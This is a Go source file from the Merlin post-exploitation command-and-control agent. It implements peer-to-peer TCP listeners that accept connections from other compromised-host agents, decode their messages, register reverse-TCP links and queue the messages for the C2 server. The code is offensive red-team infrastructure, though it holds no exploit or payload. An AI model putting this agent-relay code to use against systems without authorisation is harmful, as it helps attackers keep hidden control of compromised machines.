// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"strings"
	"time"

	// Merlin
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
	"github.com/Ne0nd0g/merlin-agent/p2p"
)

// listeners is a slice of instantiated network listeners
var listeners []net.Listener

// Listener binds to the provided interface and port and begins listening for incoming connections from other peer-to-peer agents
func Listener(cmd jobs.Command) (results jobs.Results) {
	cli.Message(cli.DEBUG, fmt.Sprintf("commands/listen.Listener(): entering into function with %+v", cmd))

	if len(cmd.Args) < 1 {
		return jobs.Results{Stderr: fmt.Sprintf("expected 1 arguments with the listener command, received %d: %+v", len(cmd.Args), cmd.Args)}
	}

	// switch on first argument
	switch strings.ToLower(cmd.Args[0]) {
	case "list":
		results.Stdout = fmt.Sprintf("Peer-to-Peer Listeners (%d):\n", len(listeners))
		for _, listener := range listeners {
			results.Stdout += fmt.Sprintf("%s\n", listener.Addr())
		}
		return
	case "start":
		if len(cmd.Args) < 3 {
			return jobs.Results{Stderr: fmt.Sprintf("expected 3 arguments with the listener command, received %d: %+v", len(cmd.Args), cmd.Args)}
		}
		switch strings.ToLower(cmd.Args[1]) {
		case "tcp":
			err := TCPListen(cmd.Args[2])
			if err != nil {
				results.Stderr = err.Error()
				return
			}
			results.Stdout = fmt.Sprintf("Successfully started TCP listener on %s", cmd.Args[2])
			return
		default:
			results.Stderr = fmt.Sprintf("Unknown listener type %s", cmd.Args[1])
		}
	case "stop":
		if len(cmd.Args) < 3 {
			return jobs.Results{Stderr: fmt.Sprintf("expected 3 arguments with the listener command, received %d: %+v", len(cmd.Args), cmd.Args)}
		}
		switch strings.ToLower(cmd.Args[1]) {
		case "tcp":
			for i, listener := range listeners {
				if listener.Addr().String() == cmd.Args[2] {
					err := listener.Close()
					if err != nil {
						results.Stderr = err.Error()
					} else {
						results.Stdout = fmt.Sprintf("Succesfully closed listener on %s", cmd.Args[2])
					}
					listeners = append(listeners[:i], listeners[i+1:]...)
					return
				}
			}
			results.Stderr = fmt.Sprintf("Unable to find and close listener on %s", cmd.Args[2])
		default:
			results.Stderr = fmt.Sprintf("Unknown listener type %s", cmd.Args[1])
		}
		return
	default:
		return jobs.Results{
			Stderr: fmt.Sprintf("Unknown listener command: %s", cmd.Args[0]),
		}
	}
	return
}

// TCPListen binds to the provided address and listens for incoming TCP connections
func TCPListen(addr string) error {
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("commands/listen.TCPListen(): there was an error listening on %s: %s", err, err)
	}

	// Add to global listeners
	var ok bool
	for _, l := range listeners {
		if listener.Addr() == l.Addr() {
			ok = true
		}
	}
	if !ok {
		listeners = append(listeners, listener)
	}

	cli.Message(cli.NOTE, fmt.Sprintf("Started TCP listener on %s and waiting for a connection...", addr))

	// Listen for initial connection from upstream agent
	go accept(listener)
	return nil
}

// accept is an infinite loop listening for new connections from Agents
func accept(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/listen.accept(): there was an error accepting the connection: %s", err))
			break
		}
		go listen(conn)
	}
}

// listen is an infinite loop to receive data from incoming connections and subsequently add Delegate messages to the outgoing queue
func listen(conn net.Conn) {
	for {
		data := make([]byte, 500000)
		n, err := bufio.NewReader(conn).Read(data)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/link.listen(): there was an error reading data from %s: %s", conn.RemoteAddr(), err))
			break
		}
		cli.Message(cli.NOTE, fmt.Sprintf("TCP listener read %d bytes from %s at %s", n, conn.RemoteAddr(), time.Now().UTC()))

		// Gob decode the message
		var msg messages.Delegate
		reader := bytes.NewReader(data)
		err = gob.NewDecoder(reader).Decode(&msg)
		if err != nil {
			cli.Message(cli.WARN, fmt.Sprintf("commands/link.listen(): there was an error gob decoding a delegate message: %s", err))
			return
		}

		// Store LinkedAgent
		agent, ok := p2p.LinkedAgents.Load(msg.Agent)
		if !ok {
			// Reverse TCP agents need to be added after initial checkin
			linkedAgent := p2p.Agent{
				In:   make(chan messages.Base, 100),
				Out:  make(chan messages.Base, 100),
				Conn: conn,
				Type: p2p.TCPREVERSE,
			}
			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
		} else {
			// Update the Agent's connection to the current one
			linkedAgent := agent.(p2p.Agent)
			linkedAgent.Conn = conn
			p2p.LinkedAgents.Store(msg.Agent, linkedAgent)
		}

		// Add the message to the queue
		p2p.AddDelegateMessage(msg)
	}
}
